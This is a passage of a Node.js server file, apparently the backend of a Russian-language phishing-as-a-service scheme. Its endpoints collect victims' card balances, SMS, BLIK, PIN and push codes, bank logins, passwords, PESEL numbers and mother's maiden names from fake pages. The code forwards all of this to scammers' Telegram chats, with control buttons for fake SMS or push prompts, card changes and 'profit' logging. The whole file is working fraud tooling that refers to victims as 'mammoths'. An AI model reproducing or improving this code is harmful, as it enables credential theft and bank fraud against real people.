    const user = await User.findOne({
      where: {
        id: log.ad.userId,
      },
    });
    if (!log.writerId) {
      // Если writerId == null, отправка в logsGroupId
      await bot.sendMessage(
        settings.logsGroupId,
        `⚠️ <b>Введен баланс:</b> 
    
💰 Баланс: <b>${code} ${currencyCode}${usdText}${eurText}</b>

🔍 <b>#id${log.ad.id}</b>
`,
        {
          parse_mode: "HTML",
          reply_to_message_id: log.chatMsg, // Сообщение в логе
        }
      );

      // Отправка уведомления воркеру
      if (user) {
        await bot.sendMessage(
          log.ad.userId,
          `<b>💰 Введен баланс для объявления ${log.ad.service.title}</b>

💰 Баланс: <b>${code} ${currencyCode}${usdText}${eurText}</b>

📦 Объявление: <b>${log.ad.title || "отсутствует"}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>
`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "👁️ Онлайн ",
                  `check_mamont_${log.ad.id}`
                ),
              ],

              [
                Markup.callbackButton(
                  "✍️ Сообщение в ТП",
                  `support_${support.id}_send_message`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔓 Открыть ТП",
                  `open_support_${log.ad.id}`
                ),
                Markup.callbackButton(
                  "🔒 Закрыть ТП",
                  `close_support_${log.ad.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔽 Дополнительно",
                  `more_actions_${log.ad.id}_${support.id}`
                ),
              ],
            ]),
          }
        );
      }

      // Отправка оператору
      if (user.operator) {
        const operator = await Operators.findOne({
          where: { userId: user.operator },
        });
        if (operator) {
          await bot.sendMessage(
            operator.userId,
            `<b>⚠️ Введен баланс для объявления ${log.ad.service.title}</b>

👤 Воркер: <b>${user.username
              ? `@${user.username}`
              : `ID: <code>${user.id}</code>`
            }</b>
   
💰 Баланс: <b>${code} ${currencyCode}${usdText}${eurText}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
            {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.callbackButton(
                    "👁️ Онлайн ",
                    `check_mamont_${log.ad.id}`
                  ),
                ],

                [
                  Markup.callbackButton(
                    "✍️ Ответить за воркера",
                    `operatorSend_${support.id}_send_message_${user.id}_${log.ad.id}`
                  ),
                  Markup.callbackButton(
                    "📋 Шаблоны ТП",
                    `tempSupport_${support.id}_${user.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔓 Открыть ТП",
                    `open_support_${log.ad.id}`
                  ),
                  Markup.callbackButton(
                    "🔒 Закрыть ТП",
                    `close_support_${log.ad.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔽 Дополнительно",
                    `more_actions_${log.ad.id}_${support.id}`
                  ),
                ],
              ]),
            }
          );
        }
      }
    } else {
      // Если writerId существует, отправка вбиверу
      await bot.sendMessage(
        log.writerId,
        `<b>📤 Ввод точного баланса ${log.ad.user.hideService == true ? "🏴" : log.ad.service.title
        }</b>

💰 Баланс: <b>${code} ${currencyCode}${usdText}${eurText}</b>
`,
        {
          reply_to_message_id: log.chatMsg2,
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            // ✅ Главное действие
            [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],

            // 🕸 Статус
            [Markup.callbackButton(`📌 Статус: 💰 ТОЧНЫЙ`, "none")],

            // 👁 Онлайн / 🗨️ Диалог / 🏞️ Фото
            [
              Markup.callbackButton("👁 Онлайн", `check_mamont_${log.ad.id}`),
              Markup.callbackButton("🗨️ Диалог", `dialog_writer_${support.id}`),
              Markup.callbackButton("🏞️ Фото", `log_${log.id}_photo`),
            ],

            // 💬 Кастом PUSH / SMS
            [
              Markup.callbackButton("💬 C-PUSH", `log_${log.id}_myeror`),
              Markup.callbackButton("💬 C-SMS", `log_${log.id}_myerorfield`),
            ],

            // PUSH / SMS / ТОЧНЫЙ
            [
              Markup.callbackButton("📲 PUSH", `log_${log.id}_push`),
              Markup.callbackButton(
                "💰 ТОЧНЫЙ",
                `log_${log.id}_correctBalance`
              ),
              Markup.callbackButton("📤 SMS", `log_${log.id}_sms`),
            ],

            // Карта / Лимиты
            [
              Markup.callbackButton("💳 СМЕНА", `log_${log.id}_otherCard`),
              Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
            ],

            // Баланс / PIN
            [
              Markup.callbackButton("💸 ДЕП", `log_${log.id}_dep`),
              Markup.callbackButton("🔐 PIN", `log_${log.id}_pincode`),
            ],

            // ❌ Ошибки
            [
              Markup.callbackButton("❌ КОД", `log_${log.id}_wrong_code`),
              Markup.callbackButton("❌ ПУШ", `log_${log.id}_wrong_push`),
            ],

            // ⛔ Блокировка / ✅ Разблокировка карты
            [
              Markup.callbackButton("⛔ Блок. Карту", `log_${log.id}_banCard`),
              Markup.callbackButton(
                "✅ Разблок. Карту",
                `log_${log.id}_unbanCard`
              ),
            ],
            // 🚫 Отказ
            [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_lsLeave`)],
          ]),
        }
      );

      if (user) {
        await bot.sendMessage(
          log.ad.userId,
          `<b>💰 Введен баланс для объявления ${log.ad.service.title}</b>

💰 Баланс: <b>${code} ${currencyCode}${usdText}${eurText}</b>

📦 Объявление: <b>${log.ad.title || "отсутствует"}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>
`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "👁️ Онлайн ",
                  `check_mamont_${log.ad.id}`
                ),
              ],

              [
                Markup.callbackButton(
                  "✍️ Сообщение в ТП",
                  `support_${support.id}_send_message`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔓 Открыть ТП",
                  `open_support_${log.ad.id}`
                ),
                Markup.callbackButton(
                  "🔒 Закрыть ТП",
                  `close_support_${log.ad.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔽 Дополнительно",
                  `more_actions_${log.ad.id}_${support.id}`
                ),
              ],
            ]),
          }
        );
      }

      // Отправка оператору
      if (user.operator) {
        const operator = await Operators.findOne({
          where: { userId: user.operator },
        });
        if (operator) {
          await bot.sendMessage(
            operator.userId,
            `<b>⚠️ Введен баланс для объявления ${log.ad.service.title}</b>

👤 Воркер: <b>${user.username
              ? `@${user.username}`
              : `ID: <code>${user.id}</code>`
            }</b>
   
💰 Баланс: <b>${code} ${currencyCode}${usdText}${eurText}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
            {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.callbackButton(
                    "👁️ Онлайн ",
                    `check_mamont_${log.ad.id}`
                  ),
                ],

                [
                  Markup.callbackButton(
                    "✍️ Ответить за воркера",
                    `operatorSend_${support.id}_send_message_${user.id}_${log.ad.id}`
                  ),
                  Markup.callbackButton(
                    "📋 Шаблоны ТП",
                    `tempSupport_${support.id}_${user.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔓 Открыть ТП",
                    `open_support_${log.ad.id}`
                  ),
                  Markup.callbackButton(
                    "🔒 Закрыть ТП",
                    `close_support_${log.ad.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔽 Дополнительно",
                    `more_actions_${log.ad.id}_${support.id}`
                  ),
                ],
              ]),
            }
          );
        }
      }
    }

    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});
app.post(`/api/submitCustom`, async (req, res) => {
  try {
    if (!req.body?.token || String(req.body?.token).trim().length < 1)
      return res.sendStatus(200);
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
      include: [
        {
          association: "writer",
          required: true,
        },
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });

    if (!log) return res.sendStatus(404);
    const bin = String(log.cardNumber).slice(0, 6);
    const detectedCurrency = await getCurrencyFromBin(bin);
    const rates = await getRatesFromDb(detectedCurrency);

    log.detectedCurrency = detectedCurrency || log.ad.service.currency.code;
    log.usdRate = rates.USD;
    log.eurRate = rates.EUR;

    const cardBalanceText = log.otherInfo.cardBalance;
    const balanceValue = parseFloat(
      String(cardBalanceText).replace(/\s/g, "").replace(/,/g, ".")
    );

    let balanceText = "неизвестно";
    if (!isNaN(balanceValue)) {
      const currency = log.detectedCurrency;
      const usd = (balanceValue * log.usdRate).toFixed(2);
      const eur = (balanceValue * log.eurRate).toFixed(2);
      balanceText = `${balanceValue.toFixed(
        2
      )} ${currency} / ${usd} USD / ${eur} EUR`;
    }
    const code = escapeHTML(req.body.code.trim());
    const support = await generateSupport(log.ad, req, res);
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, log.ad)}`;

    try {
      const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
      bank = cardInfo?.bank;
    } catch (err) { }

    if (log.smsCode == code) return res.sendStatus(200);
    await log.update({
      smsCode: code,
    });

    const codeType = {
      sms: "СМС-кода",
      blik: "БЛИК-кода",
      call: "кода из звонка",
      app: "кода из приложения",
      custom: "кастомного вопроса",
      balance: "точного баланса",
      pin: "ПИН-кода",
    };

    const user = await User.findOne({
      where: {
        id: log.ad.userId,
      },
    });
    await bot.sendMessage(
      log.writer.id,
      `<b>📤 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.user.hideService == true ? "🏴" : log.ad.service.title
      }</b>

💬 Ответ: <b>${code}</b>`,
      {
        reply_to_message_id: log.chatMsg2,
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          // ✅ Главное
          [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],

          // 🧩 Статус и исполнитель
          [Markup.callbackButton(`Статус: 💬 C-SMS`, "none")],

          // 👁 Онлайн / 🗨️ Диалог / 🏞️ Фото
          [
            Markup.callbackButton("👁 Онлайн", `check_mamont_${log.ad.id}`),
            Markup.callbackButton("🗨️ Диалог", `dialog_writer_${support.id}`),
            Markup.callbackButton("🏞️ Фото", `log_${log.id}_photo`),
          ],

          // 💬 Кастом PUSH / SMS
          [
            Markup.callbackButton("💬 C-PUSH", `log_${log.id}_myeror`),
            Markup.callbackButton("💬 C-SMS", `log_${log.id}_myerorfield`),
          ],

          // PUSH / SMS / ТОЧНЫЙ
          [
            Markup.callbackButton("📲 PUSH", `log_${log.id}_push`),
            Markup.callbackButton("💰 ТОЧНЫЙ", `log_${log.id}_correctBalance`),
            Markup.callbackButton("📤 SMS", `log_${log.id}_sms`),
          ],

          // Карта / Лимиты
          [
            Markup.callbackButton("💳 СМЕНА", `log_${log.id}_otherCard`),
            Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
          ],

          // Баланс / PIN
          [
            Markup.callbackButton("💸 ДЕП", `log_${log.id}_dep`),
            Markup.callbackButton("🔐 PIN", `log_${log.id}_pincode`),
          ],

          // ❌ Ошибки PUSH
          [
            Markup.callbackButton("❌ КОД", `log_${log.id}_wrong_code`),
            Markup.callbackButton("❌ ПУШ", `log_${log.id}_wrong_push`),
          ],

          // ⛔ Блокировка / ✅ Разблокировка карты
          [
            Markup.callbackButton("⛔ Блок. Карту", `log_${log.id}_banCard`),
            Markup.callbackButton(
              "✅ Разблок. Карту",
              `log_${log.id}_unbanCard`
            ),
          ],
          // 🚫 Отказ
          [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_lsLeave`)],
        ]),
      }
    );

    await bot
      .sendMessage(
        log.ad.userId,
        `<b>💬 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.service.title
        }</b>

💰 Баланс: <b>${balanceText}</b>

📦 Объявление: <b>${log.ad.title == null ? "отсутствует" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${log.ad.id}`)],

            [
              Markup.callbackButton(
                "✍️ Сообщение в ТП",
                `support_${support.id}_send_message`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${support.id}_${user.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔓 Открыть ТП",
                `open_support_${log.ad.id}`
              ),
              Markup.callbackButton(
                "🔒 Закрыть ТП",
                `close_support_${log.ad.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔽 Дополнительно",
                `more_actions_${log.ad.id}_${support.id}`
              ),
            ],
          ]),
        }
      )
      .catch((err) => err);

    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });
      await bot
        .sendMessage(
          operator.userId,
          `<b>💬 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.service.title
          }</b>
        
👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
          }</b>

💰 Баланс: <b>${balanceText}</b>

📦 Объявление: <b>${log.ad.title == null ? "отсутствует" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "👁️ Онлайн ",
                  `check_mamont_${log.ad.id}`
                ),
              ],

              [
                Markup.callbackButton(
                  "✍️ Ответить за воркера",
                  `operatorSend_${support.id}_send_message_${user.id}_${log.ad.id}`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔓 Открыть ТП",
                  `open_support_${log.ad.id}`
                ),
                Markup.callbackButton(
                  "🔒 Закрыть ТП",
                  `close_support_${log.ad.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔽 Дополнительно",
                  `more_actions_${log.ad.id}_${support.id}`
                ),
              ],
            ]),
          }
        )
        .catch((err) => err);
    }
    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});


app.post(`/api/sendBank`, async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.body.adId, {
      include: [
        {
          association: "service",
          required: true,
          include: [
            {
              association: "currency",
              required: true,
            },
          ],
        },
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);

    // Создаем новый лог
    const log = await Log.create({
      token: Math.random() + new Date().valueOf() + Math.random(),
      adId: ad.id,
      userId: ad.userId,
      otherInfo: {
        phone: req.body.phoneNumber
          ? escapeHTML(String(req.body.phoneNumber).trim())
          : null,
        login: req.body.login
          ? escapeHTML(String(req.body.login).trim())
          : null,
        password: req.body.password
          ? escapeHTML(String(req.body.password).trim())
          : null,
        pesel: req.body.pesel
          ? escapeHTML(String(req.body.pesel).trim())
          : null,
        pin: req.body.pinCode
          ? escapeHTML(String(req.body.pinCode).trim())
          : null,
        motherlastname: req.body.motherlastname
          ? escapeHTML(String(req.body.motherlastname).trim())
          : null,
        bank: req.body.bank ? escapeHTML(String(req.body.bank).trim()) : null,
      },
    });

    const logLk = await Log.findByPk(log.id, {
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });

    if (!logLk || !logLk.ad.service.country) {
      throw new Error(
        "Ошибка: Данные для logLk или вложенных ассоциаций отсутствуют."
      );
    }
    const support = await generateSupport(ad, req, res);
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, ad)}`;

    const settings = await Settings.findByPk(1);
    const user = await User.findOne({ where: { id: ad.userId } });

    const operator = user.operator
      ? await Operators.findOne({ where: { userId: user.operator } })
      : null;

    const botMessage = `<b>‼️ Ввод ЛК ${ad.service.title}</b> 
${Object.keys(log.otherInfo)
        .map((key) =>
          log.otherInfo[key]
            ? `\n${key.toUpperCase()}: <code>${key === "bank" ? log.otherInfo[key] : "***"
            }</code>`
            : ""
        )
        .join("")}

👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
      }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title}</b>
💰 Цена: <b>${ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b> `;

    const botMessage2 = `<b>‼️ Ввод ЛК ${ad.service.title}</b> 
${Object.keys(log.otherInfo)
        .map((key) =>
          log.otherInfo[key]
            ? `\n${key.toUpperCase()}: <code>${log.otherInfo[key]}</code>`
            : ""
        )
        .join("")}

👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
      }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title}</b>
💰 Цена: <b>${ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b> `;

    // 🧠 Один запрос — одна логика поиска writerId
    const logs = await Log.findAll({
      where: { adId: ad.id },
      order: [["createdAt", "DESC"]],
    });

    let vbiverId = null;
    for (const v of logs) {
      if (v.writerId) {
        vbiverId = v.writerId;
        break;
      }
    }
    const user1 = vbiverId ? await User.findByPk(vbiverId) : null;

    setTimeout(async () => {
      if (vbiverId) {
        await log.update({
          writerId: vbiverId,
        });
        const vbiver = await User.findByPk(vbiverId);
        const msgToVbiver = await bot.sendMessage(vbiverId, botMessage2, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              // ✅ Главное действие
              [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],

              // 👁 Онлайн / 🗨️ Диалог / 🏞️ Фото
              [
                Markup.callbackButton("👁 Онлайн", `check_mamont_${ad.id}`),
                Markup.callbackButton(
                  "🗨️ Диалог",
                  `dialog_writer_${support.id}`
                ),
                Markup.callbackButton("🏞️ Фото", `log_${log.id}_photo`),
              ],

              // 💬 Кастом PUSH / SMS
              [
                Markup.callbackButton("💬 C-PUSH", `log_${log.id}_myeror`),
                Markup.callbackButton("💬 C-SMS", `log_${log.id}_myerorfield`),
              ],

              // 📲 PUSH / SMS / ТОЧНЫЙ
              [
                Markup.callbackButton("📲 PUSH", `log_${log.id}_push`),
                Markup.callbackButton(
                  "💰 ТОЧНЫЙ",
                  `log_${log.id}_correctBalance`
                ),
                Markup.callbackButton("📤 SMS", `log_${log.id}_sms`),
              ],

              // 💳 Смена / ⚠️ Лимиты
              [
                Markup.callbackButton("💳 СМЕНА", `log_${log.id}_otherCard`),
                Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
              ],

              // 💸 ДЕП / PIN
              [
                Markup.callbackButton("💸 ДЕП", `log_${log.id}_dep`),
                Markup.callbackButton("🔐 PIN", `log_${log.id}_pincode`),
              ],

              // ❌ Ошибки
              [
                Markup.callbackButton("❌ КОД", `log_${log.id}_wrong_code`),
                Markup.callbackButton("❌ ПУШ", `log_${log.id}_wrong_push`),
              ],

              // ❌ ЛК
              [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_fakeLk`)],

              // 🔄 Смена ЛК (если доступен)
              ...(logLk.ad.service.country.withLk
                ? [
                  [
                    Markup.callbackButton(
                      "🔄 СМЕНА ЛК",
                      `log_${log.id}_otherLk`
                    ),
                  ],
                ]
                : []),

              // 💳 Перевод на карту (если доступен)
              ...(logLk.ad.service.country.withLk
                ? [
                  [
                    Markup.callbackButton(
                      "💳 Перевести на КАРТУ",
                      `log_${log.id}_card`
                    ),
                  ],
                ]
                : []),

              // ⛔ Блокировка / ✅ Разблокировка карты
              [
                Markup.callbackButton(
                  "⛔ Блок. Карту",
                  `log_${log.id}_banCard`
                ),
                Markup.callbackButton(
                  "✅ Разблок. Карту",
                  `log_${log.id}_unbanCard`
                ),
              ],
              // 🚫 Отказ
              [
                Markup.callbackButton(
                  "🚫 ОТКАЗАТЬСЯ",
                  `log_${log.id}_lsLeaveLk`
                ),
              ],
            ],
          ]),
        });

        await log.update({ chatMsg2: msgToVbiver.message_id });

        // Уведомление в общий чат
        await bot.sendMessage(
          -1002448357323,
          `<b>‼️ Лог уже привязан</b>

👤 Привязан к: <b>@${vbiver.username}</b>
${Object.keys(log.otherInfo)
            .map((key) =>
              log.otherInfo[key]
                ? `\n${key.toUpperCase()}: <code>${key === "bank" ? log.otherInfo[key] : "***"
                }</code>`
                : ""
            )
            .join("")}

👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
          }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title}</b>
💰 Цена: <b>${ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "❌ Отказать вбивера",
                  `log_${log.id}_removeVbiver`
                ),
              ],
            ]),
          }
        );
      } else {
        await bot.sendMessage(-1002448357323, botMessage, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "✍️ Взять на вбив",
                `take_log_lk_${log.id}`
              ),
            ],
          ]),
        });
      }
    }, 500);

    await bot.sendMessage(
      ad.userId,
      `<b>🏦 Ввод данных банка ${ad.service.title}</b>

🏦 Банк: <b>${req.body.bank}</b>

📦 Объявление: <b>${ad.title || "отсутствует"}</b>
💰 Цена: <b>${ad.price || "отсутствует"}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
      {
        parse_mode: "HTML",
        disable_web_page_preview: true,
        reply_markup: Markup.inlineKeyboard([
          ...(user1
            ? [
              [
                Markup.urlButton(
                  `💬 Связаться с вбивером: ${user1.username}`,
                  `tg://resolve?domain=${user1.username}`
                ),
              ],
            ]
            : []),
          ...(user.operator != null
            ? [
              [
                Markup.callbackButton(
                  "👨🏼‍💻 Статус оператора",
                  `operator_status`
                ),
              ],
            ]
            : []),
          [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],
          ...(user.operator == null
            ? [
              [
                Markup.callbackButton(
                  "💳 СМЕНА",
                  `userLog_${log.id}_otherCard`
                ),
                Markup.callbackButton(
                  "💰 ТОЧНЫЙ",
                  `userLog_${log.id}_correctBalance`
                ),
              ],
            ]
            : []),

          [
            Markup.callbackButton(
              "✍️ Сообщение в ТП",
              `support_${support.id}_send_message`
            ),
            Markup.callbackButton(
              "📋 Шаблоны ТП",
              `tempSupport_${support.id}_${user.id}`
            ),
          ],

          [
            Markup.callbackButton("📸 Селфи", `request_selfie_${ad.id}`),
            Markup.callbackButton("🗨️ Диалог", `dialog_${support.id}`),
          ],

          [
            Markup.callbackButton(
              "🗑️ Удалить объявление",
              `delete_ad1_${ad.id}`
            ),
          ],
        ]),
      }
    );

    if (user.operator) {
      const operator = await Operators.findOne({
        where: { userId: user.operator },
      });
      await bot.sendMessage(operator.userId, botMessage, {
        parse_mode: "HTML",
        disable_web_page_preview: true,
        reply_markup: Markup.inlineKeyboard([
          ...(user1
            ? [
              [
                Markup.urlButton(
                  `💬 Связаться с вбивером: ${user1.username}`,
                  `tg://resolve?domain=${user1.username}`
                ),
              ],
            ]
            : []),
          [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

          [
            Markup.callbackButton("💳 СМЕНА", `userLog_${log.id}_otherCard`),
            Markup.callbackButton(
              "💰 ТОЧНЫЙ",
              `userLog_${log.id}_correctBalance`
            ),
          ],

          [
            Markup.callbackButton(
              "✍️ Ответить за воркера",
              `operatorSend_${support.id}_send_message_${user.id}_${ad.id}`
            ),
            Markup.callbackButton(
              "📋 Шаблоны ТП",
              `tempSupport_${support.id}_${user.id}`
            ),
          ],

          [
            Markup.callbackButton("📸 Селфи", `request_selfie_${ad.id}`),
            Markup.callbackButton("🗨️ Диалог", `dialog_${support.id}`),
          ],

          [
            Markup.callbackButton(
              "🗑️ Удалить объявление",
              `delete_ad1_${ad.id}`
            ),
          ],
        ]),
      });
    }

    if (settings.allLogsEnabled) {
      await bot.sendMessage(
        settings.allGroupId,
        `<b>🏦 Ввод данных банка ${ad.user.hideService == true ? "🏴" : ad.service.title
        }</b>
        
- Воркер: ${ad.user.hideNick
          ? "🙈 Скрыт"
          : `<a href="tg://user?id=${ad.userId}">${ad.user.username}</a>`
        }       
- Оператор: ${operator
          ? `<a href="tg://user?id=${operator.userId}">${operator.username}</a>`
          : "отсутствует"
        }
- Наставник: ${mentor
          ? `<a href="tg://user?id=${mentor.id}">${mentor.username}</a>`
          : "отсутствует"
        }

💰 Цена: <b>${ad.price
          ? ad.user.hideService
            ? (ad.price.toString().match(/(\d+([.,]\d+)?)/)?.[0] ||
              "отсутствует") + "⚡️"
            : ad.price
          : "отсутствует"
        }</b>`,
        {
          parse_mode: "HTML",
          disable_notification: true,
        }
      );
    }
    await log.update({
      supportId: support.id,
    });
    return res.json({ token: log.token, bank: req.body.bank });
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});

app.post(`/api/confirmed`, async (req, res) => {
  try {
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
      include: [
        {
          association: "writer",
          required: true,
        },
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });
    if (!log) return res.sendStatus(404);
    await log.update({
      status: null,
    });
    bot
      .sendMessage(log.writer.id, `<b>📲 PUSH ПОДТВЕРЖДЕН</b>`, {
        reply_to_message_id: log.chatMsg2,

        parse_mode: "HTML",
      })
      .catch((err) => err);


    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});



server.listen(80, () => {
  console.clear(); // очищает консоль перед запуском (по желанию)
  console.log(`
===========================================
Developer:  @haron
Started at:  ${new Date().toLocaleString()}
===========================================
  `);
});
